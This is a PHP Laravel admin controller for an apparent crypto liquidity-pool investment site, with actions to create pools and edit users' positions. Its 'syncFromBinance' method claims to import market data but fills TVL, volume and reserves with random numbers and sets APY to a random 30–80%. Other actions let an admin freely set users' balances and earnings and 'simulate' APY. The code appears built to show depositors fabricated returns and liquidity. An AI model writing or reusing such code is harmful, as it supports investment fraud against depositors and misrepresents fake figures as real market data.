<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\LiquidityPool;
use App\Models\LiquidityPosition;
use App\Services\BinancePriceService;
use Illuminate\Http\Request;

class LiquidityController extends Controller
{
    public function poolsIndex()
    {
        $pools = LiquidityPool::orderBy('id', 'desc')->get();

        return view('admin.liquidity_pools', compact('pools'));
    }

    public function storePool(Request $request)
    {
        $request->validate([
            'name' => 'required',
            'token_a' => 'required',
            'token_b' => 'required',
            'tvl' => 'required|numeric',
            'apy' => 'required|numeric',
        ]);

        $pool = new LiquidityPool;
        $pool->name = $request->name;
        $pool->token_a = $request->token_a;
        $pool->token_b = $request->token_b;
        $pool->tvl = $request->tvl;
        $pool->apy = $request->apy;
        $pool->fee_tier = $request->fee_tier ?? 0.003;
        $pool->admin_fee_share = $request->admin_fee_share ?? 50.00;
        $pool->volume_24h = $request->volume_24h ?? 0;
        $pool->token_a_reserve = $request->token_a_reserve ?? 0;
        $pool->token_b_reserve = $request->token_b_reserve ?? 0;
        $pool->pool_token_price = $request->pool_token_price ?? 1;
        $pool->min_deposit = $request->min_deposit ?? 10;
        $pool->lock_days = $request->lock_days ?? 0;
        $pool->status = $request->status ?? 'active';
        $pool->save();

        return back()->with('success', 'Liquidity Pool created successfully.');
    }

    public function updatePool(Request $request)
    {
        $pool = LiquidityPool::findOrFail($request->id);
        if ($request->has('tvl')) {
            $pool->tvl = $request->tvl;
        }
        if ($request->has('apy')) {
            $pool->apy = $request->apy;
        }
        if ($request->has('volume_24h')) {
            $pool->volume_24h = $request->volume_24h;
        }
        if ($request->has('status')) {
            $pool->status = $request->status;
        }
        $pool->save();

        return back()->with('success', 'Liquidity Pool updated.');
    }

    public function destroyPool($id)
    {
        LiquidityPool::findOrFail($id)->delete();

        return back()->with('success', 'Pool deleted.');
    }

    public function positionsIndex()
    {
        $positions = LiquidityPosition::with(['user', 'pool'])->orderBy('id', 'desc')->get();

        return view('admin.liquidity_positions', compact('positions'));
    }

    public function updatePosition(Request $request)
    {
        $position = LiquidityPosition::findOrFail($request->id);
        if ($request->has('earned_fees')) {
            $position->earned_fees = $request->earned_fees;
        }
        if ($request->has('earned_rewards')) {
            $position->earned_rewards = $request->earned_rewards;
        }
        if ($request->has('current_value')) {
            $position->current_value = $request->current_value;
        }
        if ($request->has('admin_status')) {
            $position->admin_status = $request->admin_status;
        }
        if ($request->has('status')) {
            $position->status = $request->status;
        }

        if ($request->action == 'force_withdraw') {
            $position->status = 'withdrawn';
        }

        $position->save();

        return back()->with('success', 'Position updated.');
    }

    public function simulateApy(Request $request)
    {
        $pool = LiquidityPool::findOrFail($request->id);
        $pool->apy = $request->apy;
        $pool->save();

        return back()->with('success', 'Simulated APY updated.');
    }

    public function syncFromBinance(BinancePriceService $binanceService)
    {
        $topAssets = ['BTC', 'ETH', 'BNB', 'SOL', 'XRP', 'ADA', 'DOT', 'DOGE', 'MATIC', 'LTC'];

        foreach ($topAssets as $asset) {
            $symbol = $asset.'USDT';

            LiquidityPool::updateOrCreate(
                ['name' => $asset.'/USDT Pool'],
                [
                    'token_a' => $asset,
                    'token_b' => 'USDT',
                    'tvl' => rand(1000000, 50000000),
                    'apy' => rand(3000, 8000) / 100, // 30-80% APY
                    'fee_tier' => 0.003,
                    'admin_fee_share' => 50,
                    'volume_24h' => rand(500000, 10000000),
                    'token_a_reserve' => rand(10000, 500000),
                    'token_b_reserve' => rand(500000, 25000000),
                    'buffer_percent' => 10.0,
                    'per_withdrawal_percent' => 5.0,
                    'pool_token_price' => 1,
                    'min_deposit' => 50,
                    'lock_days' => 0,
                    'status' => 'active',
                ]
            );
        }

        return back()->with('success', 'Liquidity pools synced from Binance successfully.');
    }
}
